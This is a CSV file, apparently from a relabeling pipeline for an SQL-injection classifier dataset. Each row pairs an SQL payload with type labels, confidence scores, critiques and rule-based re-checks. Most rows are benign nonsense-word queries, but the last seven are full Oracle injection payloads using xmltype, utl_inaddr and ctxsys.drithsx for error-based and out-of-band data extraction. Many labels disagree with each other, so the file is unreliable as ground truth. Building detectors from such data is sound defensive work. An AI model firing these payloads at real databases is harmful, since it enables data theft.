id,payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
35754,SELECT especially FROM hello UNION SELECT composition FROM environment ORDER BY block,benign,generic,1.0,Normal SQL SELECT UNION ORDER BY,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,SELECT especially FROM hello UNION SELECT composition FROM environment ORDER BY block,False,0,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
35755,SELECT fell FROM single UNION ALL SELECT crew FROM stomach ORDER BY aboard,benign,generic,1.0,Normal SQL UNION ALL ORDER BY,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,SELECT fell FROM single UNION ALL SELECT crew FROM stomach ORDER BY aboard,False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
35756,"SELECT himself,fresh FROM unhappy WHERE course = 'giving' UNION SELECT threw, few FROM thumb",benign,generic,1.0,Normal SQL SELECT UNION WHERE,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"SELECT himself,fresh FROM unhappy WHERE course = 'giving' UNION SELECT threw, few FROM thumb",False,0,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
35757,"INSERT INTO total ( replied, job, settlers ) VALUES ( 'fastened', 'scale', 'pond' )",benign,generic,1.0,Normal SQL INSERT,RELABEL,reasoning too short (17 chars),benign,generic,"INSERT INTO total ( replied, job, settlers ) VALUES ( 'fastened', 'scale', 'pond' )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35758,"UPDATE fair SET those = 'wore', City = 'ship' WHERE weak = possibly",benign,generic,1.0,Normal SQL UPDATE,RELABEL,reasoning too short (17 chars),benign,generic,"UPDATE fair SET those = 'wore', City = 'ship' WHERE weak = possibly",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35759,SELECT below ( s ) FROM dear UNION,benign,generic,1.0,Normal SQL SELECT UNION syntax,RELABEL,benign payload contains 'union' (likely false negative),boolean_blind,generic,SELECT below ( s ) FROM dear UNION,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35760,SELECT wash ( s ) FROM aloud UNION ALL,benign,generic,1.0,Normal SQL SELECT UNION ALL,RELABEL,benign payload contains 'union' (likely false negative),boolean_blind,generic,SELECT wash ( s ) FROM aloud UNION ALL,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35761,SELECT season FROM book UNION SELECT out FROM pattern ORDER BY naturally,benign,generic,1.0,Normal SQL SELECT UNION ORDER BY,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,SELECT season FROM book UNION SELECT out FROM pattern ORDER BY naturally,False,0,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
35762,SELECT television FROM previous UNION ALL SELECT fifteen FROM jar ORDER BY equal,benign,generic,1.0,Normal SQL UNION ALL ORDER BY,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,SELECT television FROM previous UNION ALL SELECT fifteen FROM jar ORDER BY equal,False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
35763,"SELECT perhaps,point FROM syllable WHERE sleep = 'dog' UNION SELECT anywhere, you FROM grandfather",benign,generic,1.0,Normal SQL SELECT UNION WHERE,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"SELECT perhaps,point FROM syllable WHERE sleep = 'dog' UNION SELECT anywhere, you FROM grandfather",False,0,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
35764,"INSERT INTO six ( solid, automobile, wore ) VALUES ( 'hope', 'leather', 'smallest' )",benign,generic,1.0,Normal SQL INSERT,RELABEL,reasoning too short (17 chars),benign,generic,"INSERT INTO six ( solid, automobile, wore ) VALUES ( 'hope', 'leather', 'smallest' )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35765,"UPDATE shorter SET am = 'forgot', City = 'mysterious' WHERE height = away",benign,generic,1.0,Normal SQL UPDATE,RELABEL,reasoning too short (17 chars),benign,generic,"UPDATE shorter SET am = 'forgot', City = 'mysterious' WHERE height = away",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35766,"SELECT ring,amount,interior FROM sleep LEFT JOIN Orders ON size.caughtID = sharp.damage ORDER BY damage.shape",benign,generic,1.0,Normal SQL SELECT LEFT JOIN ORDER BY,RELABEL,benign payload contains 'sleep' (likely false negative),boolean_blind,generic,"SELECT ring,amount,interior FROM sleep LEFT JOIN Orders ON size.caughtID = sharp.damage ORDER BY damage.shape",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35767,SELECT clearly ( s ) FROM somebody UNION,benign,generic,1.0,Normal SQL SELECT UNION syntax,RELABEL,benign payload contains 'union' (likely false negative),boolean_blind,generic,SELECT clearly ( s ) FROM somebody UNION,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35768,SELECT shinning ( s ) FROM upward UNION ALL,benign,generic,1.0,Normal SQL SELECT UNION ALL,RELABEL,benign payload contains 'union' (likely false negative),boolean_blind,generic,SELECT shinning ( s ) FROM upward UNION ALL,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35769,SELECT flow FROM beneath UNION SELECT composition FROM shelf ORDER BY clearly,benign,generic,1.0,Normal SQL SELECT UNION ORDER BY,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,SELECT flow FROM beneath UNION SELECT composition FROM shelf ORDER BY clearly,False,0,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
35770,SELECT active FROM bottle UNION ALL SELECT hit FROM twice ORDER BY it,benign,generic,1.0,Normal SQL UNION ALL ORDER BY,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,SELECT active FROM bottle UNION ALL SELECT hit FROM twice ORDER BY it,False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
35771,"SELECT hot,valley FROM voyage WHERE north = 'smallest' UNION SELECT direct, hurried FROM rough",benign,generic,1.0,Normal SQL SELECT UNION WHERE,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"SELECT hot,valley FROM voyage WHERE north = 'smallest' UNION SELECT direct, hurried FROM rough",False,0,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
35772,"INSERT INTO watch ( help, gas, excellent ) VALUES ( 'among', 'than', 'skill' )",benign,generic,1.0,Normal SQL INSERT,RELABEL,reasoning too short (17 chars),benign,generic,"INSERT INTO watch ( help, gas, excellent ) VALUES ( 'among', 'than', 'skill' )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35773,"UPDATE to SET born = 'lion', City = 'belt' WHERE range = rising",benign,generic,1.0,Normal SQL UPDATE,RELABEL,reasoning too short (17 chars),benign,generic,"UPDATE to SET born = 'lion', City = 'belt' WHERE range = rising",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35774,SELECT * FROM largest WHERE union NOT LIKE '[function]%',benign,generic,1.0,Normal SQL SELECT NOT LIKE pattern,RELABEL,benign payload contains 'union' (likely false negative),boolean_blind,generic,SELECT * FROM largest WHERE union NOT LIKE '[function]%',False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35775,SELECT vast ( s ) FROM queen UNION,benign,generic,1.0,Normal SQL SELECT UNION syntax,RELABEL,benign payload contains 'union' (likely false negative),boolean_blind,generic,SELECT vast ( s ) FROM queen UNION,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35776,SELECT smallest ( s ) FROM key UNION ALL,benign,generic,1.0,Normal SQL SELECT UNION ALL,RELABEL,benign payload contains 'union' (likely false negative),boolean_blind,generic,SELECT smallest ( s ) FROM key UNION ALL,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35777,SELECT is FROM pleasant UNION SELECT careful FROM month ORDER BY rocky,benign,generic,1.0,Normal SQL SELECT UNION ORDER BY,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,SELECT is FROM pleasant UNION SELECT careful FROM month ORDER BY rocky,False,0,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
35778,SELECT up FROM recently UNION ALL SELECT thank FROM tip ORDER BY pack,benign,generic,1.0,Normal SQL UNION ALL ORDER BY,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,SELECT up FROM recently UNION ALL SELECT thank FROM tip ORDER BY pack,False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
35779,"SELECT corner,grandfather FROM whispered WHERE behavior = 'income' UNION SELECT slowly, frog FROM greatly",benign,generic,1.0,Normal SQL SELECT UNION WHERE,RELABEL,benign payload contains 'union' (likely false negative),union_based,generic,"SELECT corner,grandfather FROM whispered WHERE behavior = 'income' UNION SELECT slowly, frog FROM greatly",False,0,union_based,generic,Pattern match: 'union select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
35780,"INSERT INTO boy ( goose, offer, slabs ) VALUES ( 'particularly', 'course', 'exact' )",benign,generic,1.0,Normal SQL INSERT,RELABEL,reasoning too short (17 chars),benign,generic,"INSERT INTO boy ( goose, offer, slabs ) VALUES ( 'particularly', 'course', 'exact' )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35781,"UPDATE won SET known = 'prepare', City = 'far' WHERE dust = terrible",benign,generic,1.0,Normal SQL UPDATE,RELABEL,reasoning too short (17 chars),benign,generic,"UPDATE won SET known = 'prepare', City = 'far' WHERE dust = terrible",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35782,or username like char ( 37 ),union_based,generic,0.85,CHAR function for obfuscation,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,generic,or username like char ( 37 ),False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
35783,x' AND email IS NULL,boolean_blind,generic,0.8,IS NULL check,RELABEL,reasoning too short (13 chars),boolean_blind,generic,x' AND email IS NULL,False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
35784,SELECT * FROM Customers GO,polyglot,generic,0.85,GO batch separator,RELABEL,reasoning too short (18 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'polyglot' (P9),boolean_blind,generic,SELECT * FROM Customers GO,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35785,SELECT * FROM Customers -- WHERE City = 'Berlin',polyglot,generic,0.9,SQL comment injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'polyglot' (P9),boolean_blind,generic,SELECT * FROM Customers -- WHERE City = 'Berlin',False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35786,--SELECT * FROM Customers,benign,generic,1.0,SQL comment only,RELABEL,reasoning too short (16 chars),benign,generic,--SELECT * FROM Customers,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35787,/*SELECT * FROM Customers,benign,generic,1.0,SQL block comment,RELABEL,reasoning too short (17 chars),benign,generic,/*SELECT * FROM Customers,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35788,SELECT City FROM CustomersUNIONSELECT City FROM SuppliersORDER BY City,benign,generic,1.0,Normal SQL SELECT UNION,RELABEL,benign payload contains 'union' (likely false negative),boolean_blind,generic,SELECT City FROM CustomersUNIONSELECT City FROM SuppliersORDER BY City,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35789,SELECT City FROM CustomersUNION ALLSELECT City FROM Suppliers ORDER BY City,benign,generic,1.0,Normal SQL SELECT UNION ALL,RELABEL,benign payload contains 'union' (likely false negative),boolean_blind,generic,SELECT City FROM CustomersUNION ALLSELECT City FROM Suppliers ORDER BY City,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
35790,"select * from users WHERE username = ""1\' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and username = ""-3613%\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'%\' = \'""",union_based,oracle,0.95,Oracle XMLType withchr for hex encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,oracle,"1\' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and username = ""-3613%\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'%\' = \'",True,1,boolean_blind,oracle,Pattern match: 'elt (' → boolean_blind (P3); DB signature: oracle,heavy_query,oracle,contains 7+ digit number (DoS-style payload)
35791,"select * from users WHERE username = ""-7962\' ) ) as pgqz where 6058 = 6058 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --"" and username = ""1\'+ ( select onzd where 8452 = 8452",out_of_band,oracle,0.9,Oracle UTL_INADDR DNS exfil,RELABEL,rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,"select * from users WHERE username = ""-7962\' ) ) as pgqz where 6058 = 6058 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --"" and username = ""1\'+ ( select onzd where 8452 = 8452",False,0,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected
35792,"select * from users WHERE username = ""-9987 ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) or username = ""1\' ) ) )",out_of_band,oracle,0.9,Oracle CTXSYS DRITHSX OOB,RELABEL,rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,"select * from users WHERE username = ""-9987 ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) or username = ""1\' ) ) )",False,0,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected
35793,"select * from users WHERE username = ""-5352%\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and username = ""1\' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",out_of_band,oracle,0.85,Oracle DBMS_UTILITY hash exfil,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'out_of_band' (P6),boolean_blind,oracle,"select * from users WHERE username = ""-5352%\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and username = ""1\' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
35794,"select * from users WHERE username = ""-8745\' ) as xpwv where 8855 = 8855 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --"" or username = ""1\' ) ) as bswc where 1635 = 1635 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --""",out_of_band,oracle,0.9,Oracle UTL_INADDR combined,RELABEL,rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,1\' ) ) as bswc where 1635 = 1635 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,True,1,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
35795,"select * from users WHERE username = ""-8353\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) or username = ""1\'+ ( select \'rqok\' where 5074 = 5074 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) +\'""",out_of_band,oracle,0.9,Oracle CTXSYS DRITHSX nested,RELABEL,rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,"-8353\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) or username = ""1\'+ ( select \'rqok\' where 5074 = 5074 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) +\'",True,1,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected
35796,"select * from users WHERE username = ""1\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""1\' where 2389 = 2389",union_based,oracle,0.95,Oracle XMLType union extract,RELABEL,rule-check disagrees: rule says 'error_based' (P4) but labeled 'union_based' (P7),error_based,oracle,"select * from users WHERE username = ""1\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""1\' where 2389 = 2389",False,0,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
